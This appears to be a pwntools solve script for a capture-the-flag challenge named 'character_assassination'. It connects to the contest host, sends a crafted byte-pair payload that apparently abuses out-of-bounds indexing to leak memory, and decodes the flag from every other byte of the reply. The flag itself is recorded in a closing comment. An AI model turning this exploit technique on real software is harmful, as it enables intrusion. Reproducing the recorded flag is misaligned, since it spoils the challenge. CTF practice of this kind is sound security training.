#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "character-assassination.challs.pwnoh.io"
exe = context.binary = ELF('./character_assassination', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            brva 0x00000000000012FA
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT, ssl=True)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
payload = b''
for i in range(192, 0xff):
    payload += p8(30) + p8(i)
# GDB()
print(payload)
p.sendlineafter(b'> ', payload)
log.info("Flag: ")
flag = p.recvline()
for i in range(len(flag)):
    if i % 2 != 0:
        print(chr(flag[i]), end='')

p.interactive()

# bctf{wOw_YoU_sOlVeD_iT_665ff83d}